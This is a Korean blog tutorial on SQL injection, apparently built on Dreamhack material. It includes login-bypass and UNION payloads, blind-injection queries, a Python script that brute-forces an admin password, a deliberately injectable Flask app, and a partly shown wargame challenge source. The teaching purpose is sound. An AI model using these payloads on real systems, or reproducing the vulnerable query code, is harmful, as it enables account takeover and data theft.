@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="ko">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>[보안] SQL Injection 부셔보기! | nogarden.log</title>
+    <meta name="description" content="인젝션 (Injection)은 주입이라는 뜻을 지닌 영단어로써 이용자의 입력값이 애플리케이션의 처리 과정에서 구조나 문법적인 데이터로 해석되어 발생하는 취약점을 의미한다. SQL Injection &gt; SQL Injection이란, 인젝션 공격의 한 종류로써, DBMS에">
+    <meta name="author" content="노정원">
+    <meta name="keywords" content="노정원, 보안, 웹, 통신">
+    <link rel="canonical" href="https://njw.kro.kr/blog/posts/%EB%B3%B4%EC%95%88-SQL-Injection-%EC%95%8C%EC%95%84%EB%B3%B4%EA%B8%B0/">
+    <meta property="og:type" content="article">
+    <meta property="og:locale" content="ko_KR">
+    <meta property="og:site_name" content="nogarden.log">
+    <meta property="og:title" content="[보안] SQL Injection 부셔보기!">
+    <meta property="og:description" content="인젝션 (Injection)은 주입이라는 뜻을 지닌 영단어로써 이용자의 입력값이 애플리케이션의 처리 과정에서 구조나 문법적인 데이터로 해석되어 발생하는 취약점을 의미한다. SQL Injection &gt; SQL Injection이란, 인젝션 공격의 한 종류로써, DBMS에">
+    <meta property="og:image" content="https://velog.velcdn.com/images/njw/post/538c7fe6-a811-4c5e-8154-2bc4acdd23e6/image.png">
+    <meta property="og:url" content="https://njw.kro.kr/blog/posts/%EB%B3%B4%EC%95%88-SQL-Injection-%EC%95%8C%EC%95%84%EB%B3%B4%EA%B8%B0/">
+    <meta property="article:published_time" content="2026-04-27T01:13:25.040Z">
+    <meta property="article:author" content="https://njw.kro.kr/">
+    <meta property="article:tag" content="보안">
+    <meta property="article:tag" content="웹">
+    <meta property="article:tag" content="통신">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="[보안] SQL Injection 부셔보기!">
+    <meta name="twitter:description" content="인젝션 (Injection)은 주입이라는 뜻을 지닌 영단어로써 이용자의 입력값이 애플리케이션의 처리 과정에서 구조나 문법적인 데이터로 해석되어 발생하는 취약점을 의미한다. SQL Injection &gt; SQL Injection이란, 인젝션 공격의 한 종류로써, DBMS에">
+    <meta name="twitter:image" content="https://velog.velcdn.com/images/njw/post/538c7fe6-a811-4c5e-8154-2bc4acdd23e6/image.png">
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":"https://njw.kro.kr/blog/posts/%EB%B3%B4%EC%95%88-SQL-Injection-%EC%95%8C%EC%95%84%EB%B3%B4%EA%B8%B0/","headline":"[보안] SQL Injection 부셔보기!","description":"인젝션 (Injection)은 주입이라는 뜻을 지닌 영단어로써 이용자의 입력값이 애플리케이션의 처리 과정에서 구조나 문법적인 데이터로 해석되어 발생하는 취약점을 의미한다. SQL Injection > SQL Injection이란, 인젝션 공격의 한 종류로써, DBMS에","image":"https://velog.velcdn.com/images/njw/post/538c7fe6-a811-4c5e-8154-2bc4acdd23e6/image.png","datePublished":"2026-04-27T01:13:25.040Z","dateModified":"2026-04-27T01:13:25.040Z","keywords":"보안, 웹, 통신","inLanguage":"ko","author":{"@type":"Person","@id":"https://njw.kro.kr/#person","name":"노정원","url":"https://njw.kro.kr/"},"publisher":{"@type":"Person","name":"노정원","url":"https://njw.kro.kr/"}}</script>
+    <link rel="alternate" type="application/rss+xml" title="nogarden.log" href="https://njw.kro.kr/blog/rss.xml">
+    <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+    <link rel="preconnect" href="https://fastly.jsdelivr.net" crossorigin>
+    <link rel="stylesheet" href="/css/font.css" />
+    <link rel="stylesheet" href="/blog/blog.css" />
+    <link rel="icon" href="/img/noise/Sarah.webp" />
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@5/github-markdown-dark.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11/build/styles/github-dark.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11/build/highlight.min.js" defer></script>
+</head>
+
+<body>
+    <div class="noise"></div>
+
+    <header class="header" id="header">
+        <div class="header-row">
+            <div class="header-info">
+                <a href="/blog/" class="back-link">&#8592; Blog</a>
+                <p class="blog-title">nogarden.log</p>
+                <p class="blog-desc">어제보다 더 나은 오늘, 오늘보다 더 나은 내일의 코드를 짠다.</p>
+            </div>
+        </div>
+    </header>
+
+    <main class="post-container">
+        <article class="post-article">
+            <div class="post-header">
+                <h1 class="post-title">[보안] SQL Injection 부셔보기!</h1>
+                <div class="post-meta">
+                    <time class="post-date" datetime="2026-04-27T01:13:25.040Z">2026.04.27</time>
+                    <span class="post-series">보안</span>
+                </div>
+                <div class="post-tags"><span class="post-tag">보안</span><span class="post-tag">웹</span><span class="post-tag">통신</span></div>
+            </div>
+            <div class="post-thumbnail-wrap"><img class="post-thumbnail" src="https://velog.velcdn.com/images/njw/post/538c7fe6-a811-4c5e-8154-2bc4acdd23e6/image.png" alt="[보안] SQL Injection 부셔보기! 썸네일"></div>
+            <div class="post-body markdown-body">
+<p>**인젝션 (Injection)**은 주입이라는 뜻을 지닌 영단어로써 <b>이용자의 입력값이 애플리케이션의 처리 과정에서 구조나 문법적인 데이터로 해석되어 발생하는 취약점</b>을 의미한다.</p>
+<p><a href="https://velog.io/@njw/%EB%8D%B0%EC%9D%B4%ED%84%B0%EB%B2%A0%EC%9D%B4%EC%8A%A4-%EB%8D%B0%EC%9D%B4%ED%84%B0%EB%B2%A0%EC%9D%B4%EC%8A%A4%EC%99%80-%EC%95%94%ED%98%B8%ED%99%94">SQL 인젝션을 공부하기 전, DB에 대해 공부해야 한다.</a></p>
+<h1>SQL Injection</h1>
+<blockquote>
+<p>SQL Injection이란, 인젝션 공격의 한 종류로써, DBMS에서 사용하는 쿼리를 임의로 조작해 데이터베이스의 정보를 획득하는 서버 사이드 공격 취약점.</p>
+</blockquote>
+<p>**SQL Injection(SQL 인젝션)**을 이해하기 위해선 먼저 데이터베이스에 대해 알아야 한다.</p>
+<p>웹 해킹에서 <b>대부분의 취약점은 미흡한 입력값 검증에서 발생</b>한다.</p>
+<p>SQL 인젝션 또한 그러하다. 미흡한 입력값 검증 때문에 이용자의 입력값이 데이터베이스 문법으로 인식되기 때문에 공격자의 의도대로 <b>DB에서 작업을 수행하는 것</b>이다.</p>
+<p><img src="https://velog.velcdn.com/images/njw/post/8decf5de-9829-41b0-b35a-aa8506dbbea2/image.png" alt=""></p>
+<p>위 이미지를 보면 흐름을 이해할 수 있다.</p>
+<p><b>SQL Injection 공격 예시</b><br><code>SELECT * FROM accounts WHERE user_id=&#39;njwon&#39; and user_pw=&#39;password&#39;</code> 이 쿼리는 유저의 로그인을 처리하는 아주 기본적인 쿼리이다.</p>
+<p>위 쿼리를 이렇게 바꾸면 어떨까?<br><code>SELECT * FROM accounts WHERE user_id=&#39;njwon&#39; --&#39; and user_pw=&#39;password&#39;</code> <b>password 속성의 비교문을 주석 처리하면서 id만 알면 로그인을 할 수 있게 되었다.</b></p>
+<h2>Blind SQL Injection</h2>
+<p>앞서 SQL 인젝션을 통해 의도하지 않은 결과를 반환해 인증을 우회하는 것을 알아보았다. 해당 공격은 인증 우회 이외에도 데이터베이스의 데이터를 알아내기 위해 사용 가능하다. 이때 사용할 수 있는 공격 기법으로는 <b>Blind SQL Injection</b>이 있다. 해당 공격 기법은 스무고개 게임과 비슷하게 <b>공격자가 질의를 하면 서버가 긍정 혹은 부정으로 대답을 해 데이터를 알아낼 수 있다.</b></p>
+<p><b>Blind SQL Injection 공격 쿼리</b></p>
+<pre><code># 첫 번째 글자 구하기
+SELECT * FROM user_table WHERE uid=&#39;admin&#39; and substr(upw,1,1)=&#39;a&#39;-- &#39; and upw=&#39;&#39;; # False
+SELECT * FROM user_table WHERE uid=&#39;admin&#39; and substr(upw,1,1)=&#39;b&#39;-- &#39; and upw=&#39;&#39;; # True
+# 두 번째 글자 구하기
+SELECT * FROM user_table WHERE uid=&#39;admin&#39; and substr(upw,2,1)=&#39;d&#39;-- &#39; and upw=&#39;&#39;; # False
+SELECT * FROM user_table WHERE uid=&#39;admin&#39; and substr(upw,2,1)=&#39;e&#39;-- &#39; and upw=&#39;&#39;; # True 
+</code></pre>
+<p>쿼리를 살펴보면 uid가 admin인 유저의 upw를 substr() 함수에 넣어 확인하는 것을 알 수 있다.</p>
+<p><b>substr() 함수는 첫번째 인자로 들어온 문자열을 두번째 인자부터 세번째 인자까지 뽑아내 반환</b>한다.</p>
+<p>고로 위 공격 쿼리는 upw의 전체 문자열을 하나하나 확인하며 알아내는 쿼리라고 볼 수 있다.</p>
+<p>이러한 substr 외에도, 각 <b>DBMS에서 제공하는 내장 함수를 잘 이용하는 것으로 원하는 데이터를 추출</b>할 수 있다.</p>
+<h3>자동화</h3>
+<p><b>Blind SQL Injection은 한 바이트씩 비교하여 공격하는 방식이기 때문에 다른 공격에 비해 많은 시간을 들여야한다.</b> 만약 이를 사람이 직접 하나하나 확인한다면 엄청난 시간이 소요될 것이다. 이러한 문제를 해결하기 위해서는 <b>공격을 자동화하는 스크립트를 작성하는 방법</b>이 있다. 공격 스크립트를 작성하기에 앞서 유용한 라이브러리를 알아보겠다. <b>파이썬은 HTTP 통신을 위한 다양한 모듈이 존재하는데, 대표적으로 requests 모듈이 있다.</b> 해당 모듈은 다양한 메소드를 사용해 HTTP 요청을 보낼 수 있으며 응답 또한 확인할 수 있다.</p>
+<p>아래 코드는 <b>requests 모듈을 통해 HTTP의 GET 메소드 통신을 하는 예제 코드</b>이다. requests.get은 GET 메소드를 사용해 HTTP 요청을 보내는 함수로, <b>URL과 Header, Parameter와 함께 요청을 전송할 수 있다.</b><br><b>requests 모듈 GET 예제 코드</b></p>
+<pre><code>    import requests
+    url = &#39;https://dreamhack.io/&#39;
+    headers = {
+        &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;,
+        &#39;User-Agent&#39;: &#39;DREAMHACK_REQUEST&#39;
+    }
+    params = {
+        &#39;test&#39;: 1,
+    }
+    for i in range(1, 5):
+        c = requests.get(url + str(i), headers=headers, params=params)
+        print(c.request.url)
+        print(c.text)
+</code></pre>
+<p><b>아래 코드는 HTTP의 POST 메소드 통신을 하는 예제 코드이다.</b> requests.post는 POST 메소드를 사용해 HTTP 요청을 보내는 함수로 <b>URL과 Header, Body와 함께 요청을 전송할 수 있다.</b><br><b>requests 모듈 POST 예제 코드</b></p>
+<pre><code>    import requests
+    url = &#39;https://dreamhack.io/&#39;
+    headers = {
+        &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;,
+        &#39;User-Agent&#39;: &#39;DREAMHACK_REQUEST&#39;
+    }
+    data = {
+        &#39;test&#39;: 1,
+    }
+    for i in range(1, 5):
+        c = requests.post(url + str(i), headers=headers, data=data)
+        print(c.text)
+</code></pre>
+<p><b>HTTP GET request로 파라미터를 전달받는 홈페이지에 Blind SQL Injection을 시도</b>한다고 가정해보자. 공격하기에 앞서, 아스키 범위 중 이용자가 입력할 수 있는 모든 문자의 범위를 지정해야 한다. 예를 들어, 비밀번호의 경우 알파벳과 숫자 그리고 특수 문자로 이뤄진다. 이는 아스키 범위의 출력 가능한 모든 문자이며, Python에서는 <b>string 모듈을 이용해 string.printable로 접근</b>할 수 있다. 이 사안을 고려해 작성한 스크립트는 다음과 같다.</p>
+<pre><code>#!/usr/bin/python3
+    import requests
+    import string
+    # example URL
+    url = &#39;http://example.com/login&#39;
+    params = {
+        &#39;uid&#39;: &#39;&#39;,
+        &#39;upw&#39;: &#39;&#39;
+    }
+    # ascii printables
+    tc = string.printable
+    # 사용할 SQL Injection 쿼리
+    query = &#39;&#39;&#39;admin&#39; and substr(upw,{idx},1)=&#39;{val}&#39;-- &#39;&#39;&#39;
+    password = &#39;&#39;
+    # 비밀번호 길이는 20자 이하라 가정
+    for idx in range(0, 20):
+        for ch in tc:
+            # query를 이용하여 Blind SQL Injection 시도
+            params[&#39;uid&#39;] = query.format(idx=idx+1, val=ch).strip(&quot;\n&quot;)
+            c = requests.get(url, params=params)
+            print(c.request.url)
+            # 응답에 Login success 문자열이 있으면 해당 문자를 password 변수에 저장
+            if c.text.find(&quot;Login success&quot;) != -1:
+                password += ch
+                break
+    print(f&quot;Password is {password}&quot;)
+</code></pre>
+<p>코드를 살펴보면, 비밀번호에 포함될 수 있는 문자를 string 모듈을 사용해 생성하고, 한 바이트씩 모든 문자를 비교하는 반복문을 작성한다. 반복문 실행 중에 반환 결과가 참일 경우에 <b>페이지에 표시되는 &quot;Login success&quot; 문자열을 찾고,</b> 해당 결과를 <b>반환한 문자를 password 변수에 저장</b>한다. 반복문을 마치면 <b>&quot;admin&quot; 계정의 비밀번호를 알아낼 수 있다.</b></p>
+<h2>SQL</h2>
+<p>SQL은 각각 <b>DDL(Data Definition Language)</b>, <b>DML(Data Manipulation Language)</b>, **DCL(Data Control Language)**로 나뉜다.</p>
+<table>
+<thead>
+<tr>
+<th align="center">설명</th>
+<th align="center">DDL</th>
+<th align="center"><i style="text-decoration: underline;">DML</i></th>
+<th align="center">DCL</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">설명</td>
+<td align="center">구조를 정의하거나 변경, 삭제할 때 사용하는 SQL 구문</td>
+<td align="center">데이터를 조회, 삽입, 수정, 삭제할 때 사용합니다. 실무에서 가장 많이 사용되는 SQL 구문. <br>SQL 인젝션의 주 타겟이다.</td>
+<td align="center">데이터에 대한 접근을 통제하고 보안을 유지하기 위해 사용하는 구문</td>
+</tr>
+<tr>
+<td align="center">예시</td>
+<td align="center">CREATE, ALTER, DROP</td>
+<td align="center">SELECT, INSERT, UPDATE, DELETE</td>
+<td align="center">GRANT, REVOKE</td>
+</tr>
+</tbody></table>
+<p><b>SQL 인젝션의 주 타겟은 DML</b>이다. 우리가 웹서비스에서 사용하는 기능은 <b>대부분 DML</b>이기 때문이다. 그렇기에 <b>DML을 사용하는 법과 SQL 문법을 알고 있으면 SQL 인젝션을 보다 수월하게 진행할 수 있다.</b></p>
+<p>아래는 DML 문법들에 대한 설명이다.</p>
+<h3>SELECT</h3>
+<pre><code># mysql SELECT Statement https://dev.mysql.com/doc/refman/8.0/en/select.html
+
+SELECT
+    select_expr [, select_expr] ...
+FROM table_references
+WHERE where_condition
+[GROUP BY {col_name | expr | position}, ... [WITH ROLLUP]]
+[ORDER BY {col_name | expr | position} [ASC | DESC], ... [WITH ROLLUP]]
+[LIMIT {[offset,] row_count | row_count OFFSET offset}]
+</code></pre>
+<p><b>SELECT는 데이터를 조회하는 구문</b>이다. 위는 MYSQL 공식 페이지에서 제공하는 SELECT 구문의 예시이다.</p>
+<p>SELECT 구문에는 특정 조건을 만족하는 데이터를 찾기 위한 WHERE, 조회한 결과를 정렬하거나 특정 부분만을 확인하기 위한 ORDER BY, LIMIT 등이 있다.</p>
+<pre><code>SELECT
+    uid, title, boardcontent
+FROM board
+WHERE boardcontent like &#39;%abc%&#39;
+ORDER BY uid DESC
+LIMIT 5
+</code></pre>
+<p>위 예시 쿼리를 살펴보면, 먼저 <b>FROM 절을 사용해 board 테이블의 uid, title, boardcontent 데이터를 검색</b>한다. 그리고 <b>WHERE 절을 사용해 boardcontent 데이터에 “abc” 문자가 포함되어 있는지 찾는다.</b> 이렇게 찾은 데이터를 <b>ORDER BY 절을 통해 uid를 기준으로 내림차순 정렬한 후, 5개의 행을 결과로 반환</b>한다.</p>
+<h3>INSERT</h3>
+<pre><code># mysql INSERT Statement https://dev.mysql.com/doc/refman/8.0/en/insert.html
+INSERT [LOW_PRIORITY | DELAYED | HIGH_PRIORITY] [IGNORE]
+    [INTO] tbl_name
+    [PARTITION (partition_name [, partition_name] ...)]
+    [(col_name [, col_name] ...)]
+    { {VALUES | VALUE} (value_list) [, (value_list)] ...
+      |
+      VALUES row_constructor_list
+    }
+</code></pre>
+<p><b>INSERT는 데이터를 추가하는 구문</b>이다. 위는 MYSQL 공식 페이지에서 제공하는 INSERT 구문의 예시이다.</p>
+<p>INSERT 구문에는 데이터를 추가할 테이블과 컬럼을 정의하는 INTO, 추가할 데이터를 정의하는 VALUES 등이 있다.</p>
+<pre><code>INSERT 
+    INTO board (title, boardcontent)
+    VALUES (&#39;title 1&#39;, &#39;content 1&#39;), (&#39;title 2&#39;, &#39;content 2&#39;);
+</code></pre>
+<p>위 코드들은 INSERT 구문을 사용한 예시이다. 쿼리를 살펴보면, INTO 절을 사용해 추가할 테이블과 컬럼을 각각 <b>board와 title, boardcontent로 명시</b>한다. 그리고** VALUES 절을 통해 INTO 절에서 명시한 테이블의 각각의 컬럼에 “title 1”, “content 1”과 “title 2”, “content 2” 데이터를 추가**한다. 이처럼 쿼리 한 줄로 두 개 이상의 데이터를 추가할 수 있다.</p>
+<pre><code>INSERT 
+    INTO board (title, boardcontent)
+    VALUES (&#39;title 1&#39;, (select upw from users where uid=&#39;admin&#39;));
+</code></pre>
+<p>이 밖에도, 다음과 같이 서브 쿼리를 통해 다른 테이블에 존재하는 데이터를 추가할 수 있다. 쿼리를 살펴보면, 이전과 같이 추가할 테이블과 컬럼을 각각 board와 title, boardcontent로 명시한다. 그리고 데이터를 추가하되, <b>boardcontent에는 SELECT 구문을 실행해 users 테이블에 uid 컬럼의 값이 “admin”인 행을 찾고, 해당하는 행의 upw 데이터를 추가</b>한다. 이처럼 <b>서브쿼리를 사용하면 다른 테이블에 있는 데이터를 그대로 가져와 삽입</b>할 수 있다.</p>
+<h3>UPDATE</h3>
+<pre><code># mysql UPDATE https://dev.mysql.com/doc/refman/8.0/en/update.html
+UPDATE [LOW_PRIORITY] [IGNORE] table_references
+    SET assignment_list
+    [WHERE where_condition]
+</code></pre>
+<p><b>UPDATE는 데이터를 수정하는 구문</b>이다. 위는 MYSQL 공식 페이지에서 제공하는 UPDATE 구문의 예시이다.</p>
+<p>UPDATE 구문에는 수정할 컬럼과 데이터를 정의하는 SET, 수정할 데이터의 조건을 정의하는 WHERE 등이 있다.</p>
+<pre><code>UPDATE board
+    SET boardcontent = &quot;update content 2&quot;
+    WHERE title = &#39;title 1&#39;;
+</code></pre>
+<p>위는 UPDATE 구문을 사용한 예시이다. 쿼리를 살펴보면, <b>board 테이블의 boardcontent 컬럼을 “update content 2” 문자열로 수정</b>한다. 수정될 데이터의 <b>조건은 title 컬럼의 값이 “title 1”인 행인 것을 WHERE 절을 통해 알 수 있다.</b></p>
+<h3>DELETE</h3>
+<pre><code># mysql DELETE https://dev.mysql.com/doc/refman/8.0/en/delete.html
+DELETE [LOW_PRIORITY] [QUICK] [IGNORE] FROM tbl_name [[AS] tbl_alias]
+    [PARTITION (partition_name [, partition_name] ...)]
+    [WHERE where_condition]
+    [ORDER BY ...]
+    [LIMIT row_count]
+</code></pre>
+<p><b>DELETE는 데이터를 삭제하는 구문</b>입니다. 위는 MYSQL 공식 페이지에서 제공하는 DELETE 구문의 예시이다.</p>
+<p>DELETE 구문에는 삭제할 테이블을 정의하는 FROM, 삭제할 데이터의 조건을 정의하는 WHERE 절이 있다.</p>
+<pre><code>DELETE FROM board
+    WHERE title = &#39;title 1&#39;;
+</code></pre>
+<p>위는 DELETE 구문을 사용한 예시이다. 쿼리를 살펴보면, <b>board 테이블의 title 컬럼이 “title 1”인 행을 삭제</b>하는 것을 알 수 있다.</p>
+<p>위 DML 쿼리들을 사용해 <b>서비스의 CRUD 기능</b>을 <b>구현</b>할 수 있다.</p>
+<h2>SQL 특징</h2>
+<h3>UNION</h3>
+<p><b>UNION은 다수의 SELECT 구문의 결과를 결합하는 절이다.</b> 해당 절을 통해 <b>다른 테이블에 접근하거나 원하는 쿼리 결과를 생성해 애플리케이션에서 처리하는 타 데이터를 조작할 수 있다.</b> 그렇기에 UNION은 애플리케이션이 데이터베이스 쿼리의 실행 결과를 출력하는 경우 유용하게 사용할 수 있는 절이다.</p>
+<p>아래는 UNION 절의 사용 예시이다. username과 password 컬럼에 각각 &quot;DreamHack&quot;, &quot;DreamHack PW&quot;가 일치하는 데이터를 조회한 것을 알 수 있다.<br><b>UNION 절의 사용 예시</b></p>
+<pre><code>    mysql&gt; SELECT * FROM UserTable UNION SELECT &quot;DreamHack&quot;, &quot;DreamHack PW&quot;;
+    /*
+    +-----------+--------------+
+    | username  | password     |
+    +-----------+--------------+
+    | admin     | admin        |
+    | guest     | guest        |
+    | DreamHack | DreamHack PW |
+    +-----------+--------------+
+    3 rows in set (0.01 sec)
+    */
+</code></pre>
+<p>해당 구문을 사용할 때에는 두 가지 필수 조건을 만족해야 한다.<br>첫 번째로는 <b>이전 SELECT 구문과 UNION을 사용한 구문의 실행 결과 중 컬럼의 갯수가 같아야 한다.</b><br>두 번째로는 <b>특정 DBMS에서 이전 SELECT 구문과 UNION을 사용한 구문의 컬럼 타입이 같아야 한다.</b></p>
+<h3>서브 쿼리</h3>
+<p><b>서브 쿼리 (Subquery)는 한 쿼리 내에 또 다른 쿼리를 사용하는 것을 의미</b>한다. 서브 쿼리를 사용하기 위해서는 <b>쿼리 내에서 괄호 안에 구문을 삽입</b>해야하며, SELECT 구문만 사용할 수 있다. 공격자는 <b>서브 쿼리를 통해 쿼리가 접근하는 테이블이 아닌 다른 테이블에 접근</b>하거나 <b>SELECT 구문을 사용하지 않는 쿼리문에서 SQL Injection 취약점이 발생할 때 SELECT 구문을 사용</b>할 수 있다.</p>
+<pre><code>mysql&gt; SELECT 1,2,3,(SELECT 456); 
+/*
++---+---+---+--------------+
+| 1 | 2 | 3 | (SELECT 456) |
++---+---+---+--------------+
+| 1 | 2 | 3 |          456 |
++---+---+---+--------------+
+1 row in set (0.00 sec)
+*/
+</code></pre>
+<p><b>서브 쿼리의 예시.</b></p>
+<h4>COLUMNS 절</h4>
+<p>SELECT 구문의 컬럼 절에서 <b>서브 쿼리를 사용할 때에는 단일 행 (Single Row)과 단일 컬럼(Single Column)이 반환</b>되도록 해야 한다. 복수의 행 또는 컬럼을 반환하면 에러가 발생한다.</p>
+<pre><code>     mysql&gt; SELECT username, (SELECT &quot;ABCD&quot; UNION SELECT 1234) FROM users;
+    ERROR 1242 (21000): Subquery returns more than 1 row
+    mysql&gt; SELECT username, (SELECT &quot;ABCD&quot;, 1234) FROM users;
+    ERROR 1241 (21000): Operand should contain 1 column(s)
+</code></pre>
+<h4>FROM 절</h4>
+<p>FROM 절에서 사용하는 서브 쿼리를 인라인 뷰 (Inline View)라고 하며, 이는 <b>다중 행 (Multiple Row)과 다중 컬럼 (Multiple Column) 결과를 반환</b>할 수 있다. </p>
+<pre><code>     mysql&gt; SELECT * FROM (SELECT *, 1234 FROM users) as u;
+    /*
+    +----------+------+
+    | username | 1234 |
+    +----------+------+
+    | admin    | 1234 |
+    | guest    | 1234 |
+    +----------+------+
+    2 rows in set (0.00 sec)
+    */
+</code></pre>
+<h4>WHERE 절</h4>
+<p>WHERE 절에서 서브 쿼리를 사용하면 <b>다중 행 결과를 반환하는 쿼리문을 실행</b>할 수 있다.</p>
+<pre><code>mysql&gt; SELECT * FROM users WHERE username IN (SELECT &quot;admin&quot; UNION SELECT &quot;guest&quot;);
+/*
++----------+----------+
+| username | password |
++----------+----------+
+| admin    | admin    |
+| guest    | guest    |
++----------+----------+
+2 rows in set (0.00 sec)
+*/
+</code></pre>
+<h3>Application Logic</h3>
+<p><b>SQL Injection은 애플리케이션 내부에서 사용하는 데이터베이스의 데이터를 조작하는 기법</b>이다. 만약, 특정 쿼리를 실행했을 때 쿼리의 실행 결과가 애플리케이션에서 보여지지 않는다면 <b>공격자 입장에서는 데이터베이스의 정보를 추측하기 어렵다.</b> 대부분의 애플리케이션은 데이터베이스의 결과에 따라 각기 다른 기능을 수행한다. 예를 들어, 특정 번호의 게시물을 조회할 때 번호에 일치하는 게시물이 있다면 이용자에게 보여주고, 없다면 게시물이 존재하지 않는다는 메시지를 출력한다. 이를 통해 <b>공격자는 참과 거짓을 구분하여 공격을 수행할 수 있다.(Blind SQL Injection)</b></p>
+<pre><code>## pip3 install PyMySQL //pymysql 라이브러리를 설치하기 위한 명령어
+    from flask import Flask, request
+    import pymysql
+    app = Flask(__name__)
+    def getConnection():
+      return pymysql.connect(host=&#39;localhost&#39;, user=&#39;dream&#39;, password=&#39;hack&#39;, db=&#39;dreamhack&#39;, charset=&#39;utf8&#39;)
+    @app.route(&#39;/&#39; , methods=[&#39;GET&#39;])
+    def index():
+      username = request.args.get(&#39;username&#39;)
+      sql = &quot;select username from users where username=&#39;%s&#39;&quot; %username
+      conn = getConnection()
+      curs = conn.cursor(pymysql.cursors.DictCursor)
+      curs.execute(sql)
+      rows = curs.fetchall()
+      conn.close()
+      if(rows[0][&#39;username&#39;] == &quot;admin&quot;):
+        return &quot;True&quot;
+      else:
+        return &quot;False&quot;
+    app.run(host=&#39;0.0.0.0&#39;, port=8000)
+</code></pre>
+<p>위는 Flask 프레임워크를 사용한 예제 코드이다. 코드를 살펴보면, 인자로 전달된 username을 쿼리로 사용하면서 SQL Injection이 발생하며, 해당 쿼리의 결과로 username이 &quot;admin&quot;일 경우 참을, 아닌 경우에는 거짓을 반환한다.</p>
+<h4>Logic 이용 공격</h4>
+<p>데이터베이스가 아래와 같이 구성되어 있다고 가정하자.</p>
+<table>
+<thead>
+<tr>
+<th align="center">username</th>
+<th align="center">password</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">admin</td>
+<td align="center">Password_for_admin</td>
+</tr>
+<tr>
+<td align="center">guest</td>
+<td align="center">guest_Password</td>
+</tr>
+</tbody></table>
+<h4>UNION을 사용한 공격</h4>
+<p><b>UNION 절을 사용하면 두 개의 SELECT 구문의 결과를 반환하므로 참을 반환할 수 있다.</b> 아래는 SQL Injection으로 새로운 쿼리를 삽입한 모습이다. 공격 코드를 삽입하면 <b>UNION 절에서 &quot;admin&quot;을 반환하기 때문에 애플리케이션에서 참을 반환하게 된다.</b></p>
+<p><b>UNION 절을 이용한 공격</b></p>
+<pre><code>    /?username=&#39; union select &#39;admin&#39; -- -
+    ==&gt; True
+</code></pre>
+<h4>비교 구문을 사용한 공격</h4>
+<p>애플리케이션에서 &quot;admin&quot;을 반환해 관리자 권한으로 로그인하는 방법도 있지만 <b>관리자 계정의 비밀번호를 알아내는 방법 또한 존재</b>한다. SQL에서는 IF문을 사용해 비교 구문을 만들 수 있다. 해당 구문을 통해 <b>관리자 계정의 비밀번호를 한 글자씩 알아낼 수 있다.</b> 아래는 비교 구문을 통해 관리자 계정의 <b>비밀번호를 한 글자씩 알아내는 공격 쿼리</b>이다.</p>
+<pre><code>    /?username=&#39; union select if(substr(password,1,1)=&#39;B&#39;, &#39;admin&#39;, &#39;not admin&#39;) from users where username=&#39;admin&#39; -- -
+    ==&gt; False
+    /?username=&#39; union select if(substr(password,1,1)=&#39;P&#39;, &#39;admin&#39;, &#39;not admin&#39;) from users where username=&#39;admin&#39; -- -
+    ==&gt; True
+    /?username=&#39; union select if(substr(password,2,1)=&#39;a&#39;, &#39;admin&#39;, &#39;not admin&#39;) from users where username=&#39;admin&#39; -- -
+    ==&gt; True
+</code></pre>
+<p>substr() 함수를 이용해 <b>비밀번호 첫 번째 바이트가 &#39;B&#39;인지 비교</b>하고, <b>반환 결과를 통해 비밀번호의 첫 번째 바이트는 &#39;B&#39;가 아님을 알 수 있다.</b> 이후 두 번째와 세 번째 쿼리의 반환 결과를 통해 <b>첫 번째 바이트가 &#39;P&#39;, 두 번째 바이트가 &#39;a&#39;인 것을 알아낼 수 있다.</b> 이와 같은 방법으로 <b>관리자 계정의 비밀번호를 알아낼 수 있다.</b></p>
+<h2>wargame 풀이</h2>
+<p><a href="https://dreamhack.io/wargame/challenges/24">simple_sqli</a> 문제를 풀이해 보았다.</p>
+<pre><code>#!/usr/bin/python3
+from flask import Flask, request, render_template, g
+import sqlite3
+import os
+import binascii
+
+app = Flask(__name__)
+app.secret_key = os.urandom(32)
+
+try:
+    FLAG = open(&#39;./flag.txt&#39;, &#39;r&#39;).read()
+except:
+    FLAG = &#39;[**FLAG**]&#39;
+
+DATABASE = &quot;database.db&quot;
+if os.path.exists(DATABASE) == False:
+    db = sqlite3.connect(DATABASE)
+    db.execute(&#39;create table users(userid char(100), userpassword char(100));&#39;)
+    db.execute(f&#39;insert into users(userid, userpassword) values (&quot;guest&quot;, &quot;guest&quot;), (&quot;admin&quot;, &quot;{binascii.hexlify(os.urandom(16)).decode(&quot;utf8&quot;)}&quot;);&#39;)
+    db.commit()
+    db.close()
+
+def get_db():
+    db = getattr(g, &#39;_database&#39;, None)
+    if db is None:
+        db = g._database = sqlite3.connect(DATABASE)
+    db.row_factory = sqlite3.Row
+    return db
+
+def query_db(query, one=True):
+    cur = get_db().execute(query)
+    rv = cur.fetchall()
+    cur.close()
+    return (rv[0] if rv else None) if one else rv
+
+@app.teardown_appcontext
+def close_connection(exception):
+    db = getattr(g, &#39;_database&#39;, None)
+    if db is not None:
+        db.close()
+
+@app.route(&#39;/&#39;)
+def index():
+    return render_template(&#39;index.html&#39;)
+
+@app.route(&#39;/login&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
+def login():
+    if request.method == &#39;GET&#39;:
+        return render_template(&#39;login.html&#39;)
+    else:
+        userid = request.form.get(&#39;userid&#39;)
+        userpassword = request.form.get(&#39;userpassword&#39;)
+        res = query_db(f&#39;select * from users where userid=&quot;{userid}&quot; and userpassword=&quot;{userpassword}&quot;&#39;)
+        if res:
+            userid = res[0]
+            if userid == &#39;admin&#39;:
+                return f&#39;hello {userid} flag is {FLAG}&#39;
+            return f&#39;&lt;script&gt;alert(&quot;hello {userid}&quot;);history.go(-1);&lt;/script&gt;&#39;
